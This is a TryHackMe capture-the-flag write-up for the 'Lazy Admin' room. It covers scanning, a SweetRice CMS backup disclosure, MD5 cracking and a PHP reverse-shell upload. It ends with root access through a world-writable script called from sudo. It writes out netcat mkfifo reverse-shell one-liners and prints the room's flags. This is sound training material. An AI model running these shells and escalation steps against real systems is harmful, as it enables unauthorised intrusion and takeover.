#  Lazy Admin

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / CMS / RCE / Linux PrivEsc  
> **Date Completed:** 2026-04-21
  
> **Room Link:** [https://tryhackme.com/room/lazyadmin](https://tryhackme.com/room/lazyadmin)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

Lazy Admin is a beginner-friendly box running a SweetRice CMS — a known vulnerable content management system. The attack chain exploits a public backup disclosure vulnerability to recover hashed credentials from a MySQL dump, cracks the hash, logs into the CMS, uploads a PHP reverse shell via the Ads manager, and finally escalates to root by abusing a writable shell script called via a `sudo`-permitted Perl script.

**Goal:**  
Capture the user flag and root flag.

**Skills Practiced:**  
Nmap scanning, Gobuster directory fuzzing, ExploitDB research, MySQL backup disclosure, MD5 hash cracking, PHP reverse shell upload via CMS, Perl sudo privesc via writable shell script.

---

##  Reconnaissance

### Network Scanning

```bash
nmap 10.48.144.65 -sV -v
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80   | HTTP    | Apache httpd 2.4.18 (Ubuntu) |

---

##  Enumeration

### Web Application

Visiting `http://10.48.144.65/` displays the default SweetRice CMS installation page:

> *"Welcome to SweetRice — Thank you for installing SweetRice as your website management system. This site is building now, please come later."*

The CMS version is identifiable as **SweetRice 1.5.1**.

### Gobuster — Round 1

```bash
gobuster dir -u http://10.48.144.65/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Findings:**

| Path | Status |
|------|--------|
| `/content` | 301 |
| `/server-status` | 403 |

### ExploitDB Research

Searching ExploitDB for "SweetRice 1.5.1" returns a known backup disclosure vulnerability:

> **SweetRice 1.5.1 — Backup Disclosure**  
> MySQL backups are publicly accessible at `/inc/mysql_backup/`

### MySQL Backup Disclosure

```
http://10.48.144.65/content/inc/mysql_backup/
```

Directory listing reveals:

```
mysql_bakup_20191129023059-1.5.1.sql
```

Downloading and inspecting the SQL dump:

```sql
s:5:\"admin\";s:7:\"manager\";
s:6:\"passwd\";s:32:\"42f749ade7f9e195bf475f37a44cafcb\";
```

**Username: `manager`**  
**Password hash (MD5): `42f749ade7f9e195bf475f37a44cafcb`**

### Cracking the Hash

```bash
hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb /usr/share/wordlists/rockyou.txt
```

**Cracked password: `Password123`**

### Gobuster — Round 2 (inside `/content`)

```bash
gobuster dir -u http://10.48.144.65/content/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Finds the admin panel login path at `/content/as/`.

### CMS Login

Navigating to `http://10.48.144.65/content/as/` and logging in:

```
Username: manager
Password: Password123
```

Access granted to the SweetRice admin dashboard. 

---

##  Exploitation

### Vulnerability

**Type:** Authenticated RCE via CMS file upload (Ads manager)  
**Description:**  
SweetRice's Ads section allows uploading arbitrary PHP files. A pentestmonkey PHP reverse shell is uploaded and then triggered by navigating to its URL under `/content/inc/ads/`.

---

### Steps

**Step 1 — Prepare the reverse shell**

Using the pentestmonkey PHP reverse shell, set the attacker IP and port:

```php
$ip = '<YOUR_THM_IP>';
$port = 1234;
```

**Step 2 — Upload via Ads manager**

In the SweetRice admin panel, navigate to **Ads → New Ad**, name the file `evil_shell`, paste the PHP reverse shell, and click **Done**.

**Step 3 — Start the listener**

```bash
nc -lvp 1234
```

**Step 4 — Trigger the shell**

Navigate to:

```
http://10.48.144.65/content/inc/ads/evil_shell.php
```

Shell received as `www-data`. 

**Step 5 — User Flag**

```bash
ls /home
ls /home/itguy
cat /home/itguy/user.txt
```

---

##  Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

`www-data` can run a Perl script as root without a password.

### Inspecting the Perl Script

```bash
cat /home/itguy/backup.pl
```

```perl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The Perl script simply executes `/etc/copy.sh`. Checking permissions on that file:

```bash
cat /etc/copy.sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

`/etc/copy.sh` is **world-writable** — we can overwrite it with our own reverse shell payload.

### Overwriting the Shell Script

Replace the contents with a reverse shell pointing to our attacker machine:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_THM_IP> 5554 >/tmp/f" > /etc/copy.sh
```

### Start the Root Listener

```bash
nc -lvp 5554
```

### Execute the Perl Script as Root

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Root shell received on port 5554. 

```bash
whoami
# root

cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| Root Flag | `THM{6637f41d0177b6f37cb20d775124699f}` |

---

##  Key Takeaways

- **Public backup directories are a critical misconfiguration.** The MySQL dump was accessible with no authentication, directly leaking credentials from the database.
- **MD5 is not a secure password hash.** `Password123` cracked instantly against rockyou.txt. Use bcrypt or Argon2.
- **CMS file upload features are high-value targets.** If the CMS allows uploading PHP files without extension filtering, it's effectively an RCE primitive.
- **Always check what a sudo-permitted script calls.** `backup.pl` ran `copy.sh` — and `copy.sh` was world-writable. The chain is only as strong as its weakest link; auditing the full call chain matters.
- **World-writable system files are instant privilege escalation vectors.** `/etc/copy.sh` should never be writable by `www-data`.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| Gobuster | Directory enumeration (two rounds) |
| ExploitDB | SweetRice 1.5.1 backup disclosure research |
| Hashcat | MD5 password cracking |
| PHP Reverse Shell (pentestmonkey) | RCE via CMS Ads upload |
| Netcat | Reverse shell listener (ports 1234 & 5554) |

---

##  References

- [ExploitDB — SweetRice 1.5.1 Backup Disclosure](https://www.exploit-db.com/exploits/40718)
- [GTFOBins — perl](https://gtfobins.github.io/gtfobins/perl/)
- [PHP Reverse Shell — pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
- [HackTricks — Sudo Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)

---

*Writeup by Avaneesh*
